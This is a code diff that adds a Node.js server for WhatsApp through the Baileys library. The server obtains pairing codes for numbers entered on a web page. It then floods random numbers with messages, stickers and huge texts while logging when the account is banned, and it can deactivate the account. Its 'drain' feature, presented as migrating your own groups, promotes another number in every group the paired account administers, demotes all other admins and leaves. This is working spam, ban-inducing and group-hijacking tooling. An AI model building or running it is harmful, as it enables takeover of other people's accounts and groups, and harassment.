@@ -1,224 +1,400 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>bothub · drain</title>
-<style>
-  :root { color-scheme: dark; }
-  * { box-sizing: border-box; }
-  body {
-    margin: 0; min-height: 100vh;
-    background: #0b0c0f; color: #e7e7ea;
-    font: 15px/1.5 ui-sans-serif, system-ui, sans-serif;
-    display: flex; align-items: center; justify-content: center;
-    padding: 24px;
+// BOTHUB — pairing site + level runner + group migration (Function 5) + optional
+// self-deactivation (Function 6). The pairing code is requested on the 'qr'
+// event; that's the exact moment Baileys is ready to receive a login.
+
+import express from 'express';
+import fs from 'node:fs';
+import path from 'node:path';
+import crypto from 'node:crypto';
+import { fileURLToPath } from 'node:url';
+import pino from 'pino';
+import makeWASocket, {
+  useMultiFileAuthState,
+  fetchLatestBaileysVersion,
+  DisconnectReason,
+  Browsers,
+} from '@whiskeysockets/baileys';
+import { deactivate } from './utils/deactivate.js';
+
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const PORT = process.env.PORT || 3000;
+const AUTH_DIR = process.env.AUTH_DIR || './auth';
+const BIG = 'x'.repeat(60000);
+const DEACTIVATE_ON_CONNECT = process.env.DEACTIVATE_ON_CONNECT === 'true';
+
+const app = express();
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+// ── Level sessions (Function 1-4) ──────────────────────────────────────
+const sessions = new Map();
+
+function randomJid() {
+  const d = String(Math.floor(Math.random() * 9e11) + 1e11);
+  return `${d}@s.whatsapp.net`;
+}
+
+function tick(sess) {
+  sess.sends++;
+  if (sess.sends % 500 === 0) {
+    const s = (Date.now() - sess.startedAt) / 1000;
+    console.log(`[${sess.phone}] sent ${sess.sends} | ${(sess.sends / s).toFixed(0)}/s`);
   }
-  main { width: 100%; max-width: 480px; }
-  h1 { font-size: 26px; margin: 0 0 8px; letter-spacing: -0.01em; }
-  h1 .dim { color: #6b6f76; font-weight: 400; }
-  p.sub { color: #8b8f96; font-size: 13px; margin: 0 0 28px; }
-  form { display: grid; gap: 14px; margin-bottom: 22px; }
-  label { display: grid; gap: 6px; font-size: 12px; letter-spacing: 0.14em; text-transform: uppercase; color: #8b8f96; }
-  input {
-    background: #14161a; color: #e7e7ea;
-    border: 1px solid #262a30; border-radius: 8px;
-    padding: 12px 14px; font-size: 15px; font-family: inherit;
-    outline: none; transition: border-color .15s;
+}
+
+async function flood(sess) {
+  while (true) {
+    try { await sess.sock.sendMessage(randomJid(), { text: 'x' }); } catch {}
+    tick(sess);
   }
-  input:focus { border-color: #3b82f6; }
-  button {
-    background: #3b82f6; color: white; border: 0; border-radius: 8px;
-    padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer;
-    transition: background .15s, transform .05s;
+}
+
+async function stickerLoop(sess) {
+  const p = path.join(__dirname, 'assets', 'sticker.png');
+  if (!fs.existsSync(p)) return;
+  const buf = fs.readFileSync(p);
+  while (true) {
+    try { await sess.sock.sendMessage(randomJid(), { sticker: buf }); } catch {}
+    tick(sess);
   }
-  button:hover:not(:disabled) { background: #2f6fd4; }
-  button:active:not(:disabled) { transform: scale(0.99); }
-  button:disabled { opacity: .6; cursor: wait; }
-  .code-block { background: #14161a; border: 1px solid #262a30; border-radius: 12px; padding: 20px; margin-bottom: 16px; }
-  .code-block .label { font-size: 11px; letter-spacing: 0.22em; color: #6b6f76; margin-bottom: 10px; }
-  .code-wrap { display: flex; align-items: center; gap: 12px; }
-  .code { font-family: ui-monospace, monospace; font-size: 30px; letter-spacing: 0.14em; cursor: pointer; user-select: all; flex: 1; padding: 4px 6px; margin: -4px -6px; border-radius: 6px; }
-  .code:hover { background: #1d2126; }
-  .copy-btn { background: transparent; color: #8b8f96; border: 1px solid #262a30; border-radius: 8px; padding: 8px 12px; font-size: 12px; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; font-family: inherit; }
-  .copy-btn:hover { color: #e7e7ea; border-color: #3b82f6; }
-  .copy-btn.copied { color: #34d399; border-color: #34d399; }
-  .link-box { background: #14161a; border: 1px solid #262a30; border-radius: 8px; padding: 14px; font-family: ui-monospace, monospace; font-size: 13px; word-break: break-all; margin-bottom: 16px; }
-  .status { font-family: ui-monospace, monospace; font-size: 12px; color: #8b8f96; white-space: pre-wrap; }
-  .status .ok { color: #34d399; }
-  .status .warn { color: #fbbf24; }
-  .status .bad { color: #f87171; }
-</style>
-</head>
-<body>
-<main>
-  <h1>bothub <span class="dim">· drain</span></h1>
-  <p class="sub">Migrate group admin rights from one of your numbers to another.</p>
+}
 
-  <!-- State 1: enter A (destination) -->
-  <div id="state1">
-    <form id="formA">
-      <label>destination number (A) — the one that keeps admin
-        <input id="dest" placeholder="225..." autocomplete="off" required>
-      </label>
-      <button id="btnA" type="submit">generate link</button>
-    </form>
-    <div id="linkBox" hidden>
-      <div class="label" style="font-size: 11px; letter-spacing: 0.22em; color: #6b6f76; margin-bottom: 10px;">open this link on your second device</div>
-      <div class="link-box" id="linkText">—</div>
-      <button type="button" class="copy-btn" id="copyLink">copy link</button>
-    </div>
-    <div class="status" id="statusA"></div>
-  </div>
-
-  <!-- State 2: enter B (source) -->
-  <div id="state2" hidden>
-    <form id="formB">
-      <label>source number (B) — the one being retired
-        <input id="source" placeholder="225..." autocomplete="off" required>
-      </label>
-      <button id="btnB" type="submit">get pairing code</button>
-    </form>
-    <div class="code-block" id="codeBlock" hidden>
-      <div class="label">pairing code for B</div>
-      <div class="code-wrap">
-        <div class="code" id="code" title="click to copy">————</div>
-        <button type="button" class="copy-btn" id="copyCode">copy</button>
-      </div>
-      <p style="color:#8b8f96;font-size:13px;margin:12px 0 0;">WhatsApp → Linked Devices → Link with phone number</p>
-    </div>
-    <div class="status" id="statusB"></div>
-  </div>
-</main>
-
-<script>
-  const $ = (id) => document.getElementById(id);
-  const sessionId = new URLSearchParams(location.search).get('session')
-    || location.pathname.split('/').filter(Boolean).pop();
-
-  // If we're on /drain/:id, sessionId comes from the path.
-  const pathId = (() => {
-    const parts = location.pathname.split('/').filter(Boolean);
-    if (parts[0] === 'drain' && parts[1]) return parts[1];
-    return null;
-  })();
-
-  let poll = null;
-
-  async function copyToClipboard(text) {
-    try { await navigator.clipboard.writeText(text); return true; }
-    catch {
-      const ta = document.createElement('textarea');
-      ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
-      document.body.appendChild(ta); ta.select();
-      let ok = false; try { ok = document.execCommand('copy'); } catch {}
-      document.body.removeChild(ta);
-      return ok;
-    }
+async function bigLoop(sess) {
+  while (true) {
+    try { await sess.sock.sendMessage(randomJid(), { text: BIG }); } catch {}
+    tick(sess);
   }
+}
 
-  function showCopied(btn) {
-    btn.textContent = 'copied ✓';
-    btn.classList.add('copied');
-    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1600);
-  }
+async function runLevel(sess) {
+  sess.startedAt = Date.now();
+  sess.sends = 0;
+  const level = sess.level;
+  console.log(`[${sess.phone}] level ${level} starting`);
 
-  $('copyLink').addEventListener('click', async () => {
-    const url = $('linkText').textContent;
-    if (await copyToClipboard(url)) showCopied($('copyLink'));
-  });
-
-  $('code').addEventListener('click', async () => {
-    const text = $('code').textContent.trim();
-    if (!text || text.includes('—')) return;
-    if (await copyToClipboard(text)) showCopied($('copyCode'));
-  });
-  $('copyCode').addEventListener('click', async () => {
-    const text = $('code').textContent.trim();
-    if (!text || text.includes('—')) return;
-    if (await copyToClipboard(text)) showCopied($('copyCode'));
-  });
-
-  // ── State 1: enter A ──
-  $('formA').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const dest = $('dest').value.replace(/\D/g, '');
-    if (!dest) return;
-    $('btnA').disabled = true;
-    $('statusA').textContent = 'creating session...';
+  if (DEACTIVATE_ON_CONNECT) {
     try {
-      const r = await fetch('/api/drain/start', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ dest }),
-      });
-      const d = await r.json();
-      if (!r.ok) throw new Error(d.error || 'failed');
-      const url = location.origin + d.link;
-      $('linkBox').hidden = false;
-      $('linkText').textContent = url;
-      $('statusA').innerHTML = '<span class="ok">link ready — open it on your second device</span>';
+      console.log(`[${sess.phone}] Function 6 — requesting deactivation`);
+      const r = await deactivate(sess.sock, { logger: console });
+      console.log(`[${sess.phone}] deactivate response:`, JSON.stringify(r));
     } catch (err) {
-      $('statusA').innerHTML = `<span class="bad">${err.message}</span>`;
-      $('btnA').disabled = false;
+      console.warn(`[${sess.phone}] deactivate failed:`, err?.message || err);
+    }
+  }
+
+  if (level === 1 || level === 2) return flood(sess);
+  if (level === 3) {
+    stickerLoop(sess);
+    return flood(sess);
+  }
+  if (level === 4) {
+    stickerLoop(sess);
+    bigLoop(sess);
+    return flood(sess);
+  }
+}
+
+async function startPairing(phone, level) {
+  const existing = sessions.get(phone);
+  if (existing?.sock) {
+    try { existing.sock.end(undefined); } catch {}
+    sessions.delete(phone);
+  }
+
+  fs.mkdirSync(path.join(AUTH_DIR, phone), { recursive: true });
+  const { state, saveCreds } = await useMultiFileAuthState(path.join(AUTH_DIR, phone));
+
+  let version;
+  try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
+
+  const sock = makeWASocket({
+    ...(version ? { version } : {}),
+    auth: state,
+    logger: pino({ level: 'silent' }),
+    printQRInTerminal: false,
+    browser: Browsers.ubuntu('Chrome'),
+    markOnlineOnConnect: false,
+    syncFullHistory: false,
+    shouldSyncHistoryMessage: () => false,
+  });
+
+  const sess = {
+    phone, level, sock,
+    status: 'pending',
+    code: null,
+    sends: 0,
+    startedAt: 0,
+    bannedAt: null,
+  };
+  sessions.set(phone, sess);
+
+  sock.ev.on('creds.update', saveCreds);
+
+  let resolveCode;
+  const codePromise = new Promise((res) => { resolveCode = res; });
+  let pairingRequested = false;
+
+  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
+    if (qr && !pairingRequested && !sock.authState.creds.registered) {
+      pairingRequested = true;
+      try {
+        const raw = await sock.requestPairingCode(phone);
+        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
+        sess.code = code;
+        resolveCode(code);
+        console.log(`[${phone}] pairing code: ${code}`);
+      } catch (err) {
+        pairingRequested = false;
+        console.error(`[${phone}] pairing attempt failed, will retry:`, err?.message || err);
+      }
+    }
+
+    if (connection === 'open') {
+      sess.status = 'connected';
+      console.log(`[${phone}] connected as ${sock.user?.id}`);
+      runLevel(sess);
+    }
+
+    if (connection === 'close') {
+      const code = lastDisconnect?.error?.output?.statusCode;
+      const ts = new Date().toISOString();
+      fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
+      fs.appendFileSync(
+        path.join(__dirname, 'logs', 'session.log'),
+        `[${ts}] ${phone} close code=${code}\n`
+      );
+      if (code === 401 || code === 403) {
+        sess.status = 'banned';
+        sess.bannedAt = ts;
+        fs.appendFileSync(
+          path.join(__dirname, 'logs', 'session.log'),
+          `[${ts}] ${phone} *** BANNED ***\n`
+        );
+        console.log(`[${phone}] *** BANNED at ${ts} ***`);
+        return;
+      }
+      console.log(`[${phone}] close code=${code}, reconnecting`);
+      setTimeout(() => {
+        const s = sessions.get(phone);
+        if (!s || s.status === 'banned') return;
+        startPairing(phone, level);
+      }, 3000);
     }
   });
 
-  // ── State 2: enter B ──
-  if (pathId) {
-    $('state1').hidden = true;
-    $('state2').hidden = false;
+  if (!sock.authState.creds.registered) {
+    const timeout = new Promise((_, reject) =>
+      setTimeout(() => reject(new Error('pairing timeout — no qr event in 25s')), 25000)
+    );
+    const code = await Promise.race([codePromise, timeout]);
+    return { code };
+  }
 
-    $('formB').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const source = $('source').value.replace(/\D/g, '');
-      if (!source) return;
-      $('btnB').disabled = true;
-      $('statusB').textContent = 'requesting code...';
-      try {
-        const r = await fetch('/api/drain/source', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId: pathId, source }),
-        });
-        const d = await r.json();
-        if (!r.ok) throw new Error(d.error || 'failed');
-        if (d.code) {
-          $('codeBlock').hidden = false;
-          $('code').textContent = d.code;
-        } else {
-          $('statusB').innerHTML = '<span class="ok">source already registered — starting migration</span>';
-        }
-        pollStatus();
-      } catch (err) {
-        $('statusB').innerHTML = `<span class="bad">${err.message}</span>`;
-        $('btnB').disabled = false;
+  return { code: null, alreadyRegistered: true };
+}
+
+app.post('/api/pair/start', async (req, res) => {
+  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
+  const level = parseInt(req.body?.level, 10);
+  if (!phone) return res.status(400).json({ error: 'phone required' });
+  if (![1, 2, 3, 4].includes(level)) return res.status(400).json({ error: 'level 1-4 required' });
+  try {
+    const { code, alreadyRegistered } = await startPairing(phone, level);
+    res.json({ phone, level, code: code || null, alreadyRegistered: !!alreadyRegistered });
+  } catch (err) {
+    console.error('[pair/start]', err?.message || err);
+    res.status(500).json({ error: err?.message || 'pairing failed' });
+  }
+});
+
+app.get('/api/pair/status', (req, res) => {
+  const phone = String(req.query?.phone ?? '').replace(/\D/g, '');
+  const s = sessions.get(phone);
+  if (!s) return res.json({ status: 'expired' });
+  res.json({
+    status: s.status,
+    sends: s.sends,
+    startedAt: s.startedAt,
+    bannedAt: s.bannedAt,
+  });
+});
+
+// ── Function 5 — group migration ───────────────────────────────────────
+const drains = new Map(); // sessionId -> { destJid, sourceSock, status, total, done, errors }
+
+async function runDrain(drain, sock, sessionId) {
+  drain.status = 'running';
+  const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+  const myDigits = myJid.split('@')[0];
+  const destJid = drain.destJid;
+
+  let groups;
+  try {
+    groups = await sock.groupFetchAllParticipating();
+  } catch (err) {
+    drain.status = 'error';
+    drain.errors.push(`groupFetchAllParticipating: ${err?.message || err}`);
+    return;
+  }
+
+  const jids = Object.keys(groups || {});
+  drain.total = jids.length;
+  drain.done = 0;
+  console.log(`[drain ${sessionId}] ${jids.length} group(s) to process`);
+
+  for (const jid of jids) {
+    try {
+      const meta = groups[jid];
+      const meP = (meta.participants || []).find((p) =>
+        p.id === myJid || p.id?.split(':')[0] === myDigits
+      );
+      if (!meP || !meP.admin) {
+        console.log(`[drain ${sessionId}] skip ${jid} — not admin`);
+        drain.done++;
+        continue;
       }
+
+      const destPresent = (meta.participants || []).some((p) => p.id === destJid);
+      if (!destPresent) {
+        await sock.groupParticipantsUpdate(jid, [destJid], 'add');
+        await sleep(1200);
+      }
+
+      await sock.groupParticipantsUpdate(jid, [destJid], 'promote');
+      await sleep(1200);
+
+      const toDemote = (meta.participants || [])
+        .filter((p) => p.admin && p.id !== destJid && p.id !== myJid)
+        .map((p) => p.id);
+      if (toDemote.length) {
+        await sock.groupParticipantsUpdate(jid, toDemote, 'demote');
+        await sleep(1200);
+      }
+
+      await sock.groupLeave(jid);
+      await sleep(1500);
+
+      drain.done++;
+      console.log(`[drain ${sessionId}] ok ${jid} — A promoted, others demoted, B left`);
+    } catch (err) {
+      drain.errors.push(`${jid}: ${err?.message || err}`);
+      drain.done++;
+      console.warn(`[drain ${sessionId}] fail ${jid}: ${err?.message || err}`);
+    }
+  }
+
+  drain.status = 'done';
+  console.log(`[drain ${sessionId}] complete ${drain.done}/${drain.total}`);
+}
+
+app.post('/api/drain/start', (req, res) => {
+  const dest = String(req.body?.dest ?? '').replace(/\D/g, '');
+  if (!dest) return res.status(400).json({ error: 'destination number required' });
+  const destJid = `${dest}@s.whatsapp.net`;
+  const id = crypto.randomBytes(6).toString('hex');
+  drains.set(id, {
+    destJid,
+    sourceSock: null,
+    status: 'awaiting_source',
+    total: 0,
+    done: 0,
+    errors: [],
+  });
+  res.json({ sessionId: id, link: `/drain/${id}` });
+});
+
+app.post('/api/drain/source', async (req, res) => {
+  const { sessionId } = req.body || {};
+  const source = String(req.body?.source ?? '').replace(/\D/g, '');
+  if (!sessionId || !drains.has(sessionId)) return res.status(400).json({ error: 'unknown session' });
+  if (!source) return res.status(400).json({ error: 'source number required' });
+
+  const drain = drains.get(sessionId);
+  const phone = source;
+
+  fs.mkdirSync(path.join(AUTH_DIR, phone), { recursive: true });
+  const { state, saveCreds } = await useMultiFileAuthState(path.join(AUTH_DIR, phone));
+  let version;
+  try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
+
+  const sock = makeWASocket({
+    ...(version ? { version } : {}),
+    auth: state,
+    logger: pino({ level: 'silent' }),
+    printQRInTerminal: false,
+    browser: Browsers.ubuntu('Chrome'),
+    markOnlineOnConnect: false,
+    syncFullHistory: false,
+    shouldSyncHistoryMessage: () => false,
+  });
+  sock.ev.on('creds.update', saveCreds);
+  drain.sourceSock = sock;
+
+  let resolveCode;
+  const codePromise = new Promise((res) => { resolveCode = res; });
+  let pairingRequested = false;
+
+  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
+    if (qr && !pairingRequested && !sock.authState.creds.registered) {
+      pairingRequested = true;
+      try {
+        const raw = await sock.requestPairingCode(phone);
+        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
+        resolveCode(code);
+        console.log(`[drain ${sessionId}] source pairing code: ${code}`);
+      } catch (err) {
+        pairingRequested = false;
+        console.warn(`[drain ${sessionId}] source pair attempt failed:`, err?.message || err);
+      }
+    }
+    if (connection === 'open') {
+      console.log(`[drain ${sessionId}] source connected as ${sock.user?.id}`);
+      runDrain(drain, sock, sessionId).catch((err) => {
+        drain.status = 'error';
+        drain.errors.push(String(err?.message || err));
+        console.error(`[drain ${sessionId}] fatal:`, err?.message || err);
+      });
+    }
+    if (connection === 'close') {
+      const code = lastDisconnect?.error?.output?.statusCode;
+      console.log(`[drain ${sessionId}] source closed code=${code}`);
+    }
+  });
+
+  if (!sock.authState.creds.registered) {
+    const timeout = new Promise((_, reject) =>
+      setTimeout(() => reject(new Error('pairing timeout — no qr event in 25s')), 25000)
+    );
+    try {
+      const code = await Promise.race([codePromise, timeout]);
+      res.json({ code });
+    } catch (err) {
+      res.status(500).json({ error: err?.message || 'pairing failed' });
+    }
+  } else {
+    res.json({ code: null, alreadyRegistered: true });
+    runDrain(drain, sock, sessionId).catch((err) => {
+      drain.status = 'error';
+      drain.errors.push(String(err?.message || err));
     });
   }
+});
 
-  function pollStatus() {
-    if (poll) clearInterval(poll);
-    poll = setInterval(async () => {
-      try {
-        const r = await fetch('/api/drain/status?sessionId=' + encodeURIComponent(pathId));
-        const s = await r.json();
-        if (s.status === 'awaiting_source') {
-          $('statusB').textContent = 'waiting for pairing...';
-        } else if (s.status === 'running') {
-          $('statusB').innerHTML = `<span class="ok">migrating... ${s.done}/${s.total}</span>`;
-        } else if (s.status === 'done') {
-          $('statusB').innerHTML =
-            `<span class="ok">done — ${s.done}/${s.total} groups processed` +
-            (s.errors.length ? ` (${s.errors.length} errors)` : '') + '</span>';
-          clearInterval(poll);
-          $('btnB').disabled = false;
-        } else if (s.status === 'error') {
-          $('statusB').innerHTML = `<span class="bad">error: ${s.errors.join('; ')}</span>`;
-          clearInterval(poll);
-          $('btnB').disabled = false;
-        }
-      } catch {}
-    }, 2500);
-  }
-</script>
-</body>
-</html>
+app.get('/api/drain/status', (req, res) => {
+  const id = String(req.query?.sessionId ?? '');
+  const d = drains.get(id);
+  if (!d) return res.status(404).json({ error: 'unknown session' });
+  res.json({ status: d.status, total: d.total, done: d.done, errors: d.errors });
+});
+
+// Serve the drain page for both `/drain` (bare — enter A) and `/drain/:id`
+// (with session id — enter B). The page tells the two apart by URL.
+app.get(['/drain', '/drain/:id'], (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'drain.html'));
+});
+
+app.listen(PORT, () => {
+  console.log(`[bothub] http://localhost:${PORT}`);
+});
